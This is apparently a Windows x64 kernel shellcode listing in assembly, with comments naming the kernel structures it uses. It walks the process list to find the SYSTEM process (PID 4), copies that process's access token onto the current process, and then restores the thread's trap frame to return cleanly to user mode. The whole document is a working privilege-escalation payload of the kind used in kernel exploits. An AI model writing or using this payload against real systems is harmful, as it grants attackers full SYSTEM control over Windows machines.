[BITS 64]
start:
  mov rax, [gs:0x188]       ; KPCRB.CurrentThread (_KTHREAD)
  mov rax, [rax + 0xb8]     ; APCState.Process (current _EPROCESS)
  mov r8, rax               ; Store current _EPROCESS ptr in R8
 
loop:
  mov r8, [r8 + 0x448]      ; ActiveProcessLinks
  sub r8, 0x448             ; Go back to start of _EPROCESS
  mov r9, [r8 + 0x440]      ; UniqueProcessId (PID)
  cmp r9, 4                 ; SYSTEM PID? 
  jnz loop                  ; Loop until PID == 4
 
replace:
  mov rcx, [r8 + 0x4b8]      ; Get SYSTEM token
  and cl, 0xf0               ; Clear low 4 bits of _EX_FAST_REF structure
  mov [rax + 0x4b8], rcx     ; Copy SYSTEM token to current process
 
cleanup:
  mov rax, [gs:0x188]       ; _KPCR.Prcb.CurrentThread
  mov cx, [rax + 0x1e4]     ; KTHREAD.KernelApcDisable
  inc cx                    ; Increment KTHREAD.KernelApcDisable
  mov [rax + 0x1e4], cx     ; KTHREAD.KernelApcDisable
  mov rdx, [rax + 0x90]     ; ETHREAD.TrapFrame
  mov rcx, [rdx + 0x168]    ; ETHREAD.TrapFrame.Rip
  mov r11, [rdx + 0x178]    ; ETHREAD.TrapFrame.EFlags
  mov rsp, [rdx + 0x180]    ; ETHREAD.TrapFrame.Rsp
  mov rbp, [rdx + 0x158]    ; ETHREAD.TrapFrame.Rbp
  xor eax, eax  ;
  swapgs
  o64 sysret  